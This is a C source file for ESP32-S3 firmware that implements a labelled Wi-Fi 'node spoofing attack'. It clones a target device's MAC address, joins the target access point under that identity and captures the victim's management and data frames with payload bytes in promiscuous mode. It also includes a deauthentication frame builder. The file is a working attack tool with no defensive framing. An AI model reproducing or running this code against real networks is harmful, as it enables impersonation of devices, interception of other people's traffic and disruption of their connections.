/**
 * node_spoof.c
 *
 * ESP32-S3 Node Spoofing Attack
 *
 * Flow:
 *   1. Save original MAC + AP config
 *   2. Clone target MAC via esp_wifi_set_mac()
 *   3. Connect to target AP with spoofed identity (with retry)
 *   4. Capture traffic in promiscuous mode (beacons filtered)
 *   5. Stop → restore original MAC + AP mode
 */

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_netif.h"
#include "dhcpserver/dhcpserver.h"

#include "node_spoof.h"

static const char *TAG = "NODE_SPOOF";

/* ── State ── */
static spoof_state_t   s_state;
static volatile bool   s_running = false;
static TaskHandle_t    s_task = NULL;
static wifi_config_t   s_saved_ap;

/* ── Hex dump helper (task context only, not IRAM) ── */
static void payload_to_hex(const uint8_t *data, uint16_t len, char *out, size_t out_sz)
{
    if (!data || !out || out_sz < 3) {
        if (out && out_sz) out[0] = '\0';
        return;
    }
    size_t max_bytes = (out_sz - 1) / 2;
    if (len > max_bytes) len = (uint16_t)max_bytes;
    for (uint16_t i = 0; i < len; i++) {
        snprintf(out + i * 2, 3, "%02x", data[i]);
    }
    out[len * 2] = '\0';
}

static void log_spoof_entry(int idx, const spoof_log_t *e)
{
    const char *ftype = (e->frame_type == 0) ? "MGMT" : "DATA";
    ESP_LOGI(TAG, "  [%d] %s sub=%d %02X:%02X:%02X:%02X:%02X:%02X → "
                  "%02X:%02X:%02X:%02X:%02X:%02X rssi=%d ch=%d len=%d",
             idx, ftype, e->subtype,
             e->src_mac[0], e->src_mac[1], e->src_mac[2],
             e->src_mac[3], e->src_mac[4], e->src_mac[5],
             e->dst_mac[0], e->dst_mac[1], e->dst_mac[2],
             e->dst_mac[3], e->dst_mac[4], e->dst_mac[5],
             e->rssi, e->channel, e->len);
    if (e->payload_len > 0) {
        char hex[SPOOF_PAYLOAD_MAX * 2 + 1];
        payload_to_hex(e->payload, e->payload_len, hex, sizeof(hex));
        ESP_LOGI(TAG, "       payload(%u): %s", (unsigned)e->payload_len, hex);
    }
}

/* ── Deauth frame builder ── */
static void send_deauth(uint8_t *bssid, uint8_t *victim_mac, uint8_t channel)
{
    uint8_t frame[26] = {0};

    frame[0] = 0xC0;  /* type=mgmt, subtype=deauth */
    frame[1] = 0x00;
    memcpy(frame + 4,  victim_mac, 6);
    memcpy(frame + 10, bssid,      6);
    memcpy(frame + 16, bssid,      6);
    frame[24] = 0x07;  /* reason: class 3 from non-associated */
    frame[25] = 0x00;

    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}

/* ── Promiscuous capture callback ── */
static void IRAM_ATTR spoof_capture_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_running) return;
    if (s_state.log_count >= SPOOF_MAX_LOG) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *f = pkt->payload;

    spoof_log_t entry;
    entry.time_ms = (uint32_t)(esp_timer_get_time() / 1000);
    entry.rssi    = pkt->rx_ctrl.rssi;
    entry.channel = (uint8_t)pkt->rx_ctrl.channel;
    entry.len     = (uint16_t)pkt->rx_ctrl.sig_len;

    if (type == WIFI_PKT_MGMT) {
        entry.frame_type = 0;
        entry.subtype    = (f[0] >> 4) & 0x0F;

        /* FIX #3: Skip beacons (subtype 8) and probe requests (subtype 4) */
        if (entry.subtype == 8 || entry.subtype == 4) return;

        memcpy(entry.dst_mac, f + 4,  6);
        memcpy(entry.src_mac, f + 10, 6);
    } else if (type == WIFI_PKT_DATA) {
        entry.frame_type = 1;
        entry.subtype    = (f[0] >> 4) & 0x0F;
        /* ToDS=0, FromDS=1: Addr1=dst, Addr2=BSSID, Addr3=src */
        if ((f[1] & 0x03) == 0x02) {
            memcpy(entry.dst_mac, f + 4,  6);
            memcpy(entry.src_mac, f + 16, 6);
        }
        /* ToDS=1, FromDS=0: Addr1=BSSID, Addr2=src, Addr3=dst */
        else if ((f[1] & 0x03) == 0x01) {
            memcpy(entry.dst_mac, f + 16, 6);
            memcpy(entry.src_mac, f + 10, 6);
        } else {
            memcpy(entry.dst_mac, f + 4,  6);
            memcpy(entry.src_mac, f + 10, 6);
        }
    } else {
        return;
    }

    /* Only log frames to/from our spoofed MAC */
    if (memcmp(entry.dst_mac, s_state.target_mac, 6) != 0 &&
        memcmp(entry.src_mac, s_state.target_mac, 6) != 0) {
        return;
    }

    /* ── Capture first N bytes of payload ── */
    uint16_t hdr_len = 24;  /* 802.11 header */
    if (type == WIFI_PKT_MGMT) hdr_len = 24;
    else if (type == WIFI_PKT_DATA) {
        /* QoS data has 2 extra bytes */
        if ((f[0] & 0x8C) == 0x88) hdr_len = 26;
        /* Check for A-MSDU, mesh, etc — keep 26 as safe minimum */
        else hdr_len = 24;
    }

    uint16_t pay_total = pkt->rx_ctrl.sig_len - hdr_len;
    if (pay_total > SPOOF_PAYLOAD_MAX) pay_total = SPOOF_PAYLOAD_MAX;
    entry.payload_len = pay_total;
    if (pay_total > 0 && (hdr_len + pay_total) <= pkt->rx_ctrl.sig_len) {
        memcpy(entry.payload, f + hdr_len, pay_total);
    }

    s_state.log[s_state.log_count++] = entry;
    s_state.packets_rx++;
}

/* ── Restore AP mode ── */
static void restore_ap(void)
{
    ESP_LOGI(TAG, "Restoring AP mode...");
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(300));
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(500));

    esp_wifi_set_mac(WIFI_IF_STA, s_state.original_mac);
    ESP_LOGI(TAG, "Original MAC restored: %02X:%02X:%02X:%02X:%02X:%02X",
             s_state.original_mac[0], s_state.original_mac[1],
             s_state.original_mac[2], s_state.original_mac[3],
             s_state.original_mac[4], s_state.original_mac[5]);

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_config(WIFI_IF_AP, &s_saved_ap);
    esp_wifi_start();

    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap_netif) {
        esp_netif_dhcps_stop(ap_netif);
        vTaskDelay(pdMS_TO_TICKS(100));
        esp_netif_dhcps_start(ap_netif);
    }
    ESP_LOGI(TAG, "AP restored");
}

/* ── Spoof task ── */
static void node_spoof_task(void *arg)
{
    typedef struct { uint8_t mac[6]; char ssid[33]; char pass[65]; } params_t;
    params_t *p = (params_t *)arg;

    memcpy(s_state.target_mac, p->mac, 6);
    strncpy(s_state.ap_ssid, p->ssid, 32);
    strncpy(s_state.ap_pass, p->pass, 64);

    ESP_LOGW(TAG, "═══ NODE SPOOF START ═══");
    ESP_LOGW(TAG, "Target MAC: %02X:%02X:%02X:%02X:%02X:%02X",
             p->mac[0], p->mac[1], p->mac[2], p->mac[3], p->mac[4], p->mac[5]);
    ESP_LOGW(TAG, "Target AP:  %s", p->ssid);

    /* 1. Save original MAC + AP config */
    esp_wifi_get_mac(WIFI_IF_STA, s_state.original_mac);
    ESP_LOGI(TAG, "Original MAC saved: %02X:%02X:%02X:%02X:%02X:%02X",
             s_state.original_mac[0], s_state.original_mac[1],
             s_state.original_mac[2], s_state.original_mac[3],
             s_state.original_mac[4], s_state.original_mac[5]);

    esp_wifi_get_config(WIFI_IF_AP, &s_saved_ap);

    /* 2. Stop AP, switch to STA */
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(500));
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(500));  /* FIX #1: let WiFi init settle */

    /* 3. Clone target MAC */
    if (esp_wifi_set_mac(WIFI_IF_STA, p->mac) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set spoofed MAC");
        snprintf(s_state.error, sizeof(s_state.error), "MAC set failed");
        goto fail;
    }
    ESP_LOGI(TAG, "MAC cloned to target: %02X:%02X:%02X:%02X:%02X:%02X",
             p->mac[0], p->mac[1], p->mac[2], p->mac[3], p->mac[4], p->mac[5]);

    /* ── FIX #1: Reconfigure STA + retry connect ─────────── */
    wifi_config_t sta_cfg = {0};
    strncpy((char *)sta_cfg.sta.ssid, p->ssid, 32);
    strncpy((char *)sta_cfg.sta.password, p->pass, 63);
    sta_cfg.sta.bssid_set    = false;              /* find by SSID */
    sta_cfg.sta.channel      = 0;                  /* scan all channels */
    sta_cfg.sta.scan_method  = WIFI_ALL_CHANNEL_SCAN;
    esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);

    ESP_LOGI(TAG, "Connecting to \"%s\" with retry...", p->ssid);

    bool associated = false;
    for (int attempt = 0; attempt < 3 && s_running; attempt++) {
        esp_err_t cret = esp_wifi_connect();
        if (cret != ESP_OK) {
            ESP_LOGW(TAG, "connect attempt %d err: %s",
                     attempt + 1, esp_err_to_name(cret));
        }

        /* Wait up to 10s per attempt */
        for (int t = 0; t < 20; t++) {
            vTaskDelay(pdMS_TO_TICKS(500));
            wifi_ap_record_t ap;
            if (esp_wifi_sta_get_ap_info(&ap) == ESP_OK) {
                s_state.ap_rssi    = ap.rssi;
                s_state.ap_channel = ap.primary;
                associated = true;
                ESP_LOGI(TAG, "Connected on attempt %d (rssi=%d, ch=%d)",
                         attempt + 1, ap.rssi, ap.primary);
                break;
            }
            if (!s_running) goto fail;
        }
        if (associated) break;

        ESP_LOGW(TAG, "Attempt %d failed, retrying...", attempt + 1);
        esp_wifi_disconnect();
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    if (!associated) {
        ESP_LOGE(TAG, "Failed to connect to AP with spoofed MAC");
        snprintf(s_state.error, sizeof(s_state.error), "AP connect failed");
        goto fail;
    }

    /* ── FIX #2: DHCP check — was broken, esp_netif_get_ip_info
         returns ESP_OK (0), so `if(func() && ...)` was always false ── */
    bool got_ip = false;
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    for (int i = 0; i < 20; i++) {
        vTaskDelay(pdMS_TO_TICKS(500));
        if (netif) {
            esp_netif_ip_info_t ip_info;
            if (esp_netif_get_ip_info(netif, &ip_info) == ESP_OK
                && ip_info.ip.addr != 0) {
                got_ip = true;
                break;
            }
        }
        if (!s_running) goto fail;
    }

    s_state.connected = associated;
    ESP_LOGI(TAG, "Connected to AP (rssi=%d, ch=%d, dhcp=%s)",
             s_state.ap_rssi, s_state.ap_channel,
             got_ip ? "yes" : "no");

    /* 5. Start promiscuous capture */
    s_state.capturing = true;
    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(spoof_capture_cb);
    esp_wifi_set_promiscuous(true);

    ESP_LOGI(TAG, "Capturing traffic for %d seconds...", SPOOF_CAPTURE_TIMEOUT);

    /* 6. Capture loop */
    uint32_t start = esp_timer_get_time();
    uint16_t last_logged = 0;
    while (s_running) {
        uint32_t elapsed = (esp_timer_get_time() - start) / 1000000;
        s_state.uptime_ms = (esp_timer_get_time() - start) / 1000;

        while (last_logged < s_state.log_count) {
            log_spoof_entry((int)last_logged, &s_state.log[last_logged]);
            last_logged++;
        }

        if (elapsed >= SPOOF_CAPTURE_TIMEOUT) {
            ESP_LOGI(TAG, "Capture timeout reached (%d sec)", SPOOF_CAPTURE_TIMEOUT);
            break;
        }

        /* Check link health every 5s */
        if ((elapsed % 5) == 0) {
            wifi_ap_record_t ap;
            if (esp_wifi_sta_get_ap_info(&ap) != ESP_OK) {
                ESP_LOGW(TAG, "WiFi link lost");
                break;
            }
            s_state.ap_rssi = ap.rssi;
        }

        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    /* Stop capture */
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    s_state.capturing = false;

    ESP_LOGI(TAG, "═══ CAPTURE SUMMARY ═══");
    ESP_LOGI(TAG, "Packets captured: %lu", (unsigned long)s_state.packets_rx);
    ESP_LOGI(TAG, "Log entries:     %d / %d", s_state.log_count, SPOOF_MAX_LOG);

    for (int i = 0; i < s_state.log_count; i++) {
        log_spoof_entry(i, &s_state.log[i]);
    }

fail:
    free(p);
    restore_ap();
    s_state.active = false;
    s_running = false;
    s_task = NULL;
    vTaskDelete(NULL);
}

/* ── Public API ── */

esp_err_t node_spoof_start(const uint8_t *target_mac,
                            const char *ssid, const char *password)
{
    if (s_running) return ESP_ERR_INVALID_STATE;
    if (!target_mac || !ssid || !password) return ESP_ERR_INVALID_ARG;

    typedef struct { uint8_t mac[6]; char ssid[33]; char pass[65]; } params_t;
    params_t *p = malloc(sizeof(params_t));
    if (!p) return ESP_ERR_NO_MEM;
    memset(p, 0, sizeof(*p));
    memcpy(p->mac, target_mac, 6);
    strncpy(p->ssid, ssid, 32);
    strncpy(p->pass, password, 64);

    memset(&s_state, 0, sizeof(s_state));
    s_state.active = true;
    s_running = true;

    if (xTaskCreate(node_spoof_task, "node_spoof", 6144,
                    p, 2, &s_task) != pdPASS) {
        free(p);
        s_running = false;
        s_state.active = false;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}


esp_err_t node_spoof_stop(void)
{
    if (!s_running) return ESP_OK;
    s_running = false;

    int w = 20;
    while (s_task && w-- > 0) vTaskDelay(pdMS_TO_TICKS(100));
    if (s_task) {
        vTaskDelete(s_task);
        s_task = NULL;
    }
    return ESP_OK;
}

bool node_spoof_is_active(void) { return s_running; }

const spoof_state_t *node_spoof_get_state(void) { return &s_state; }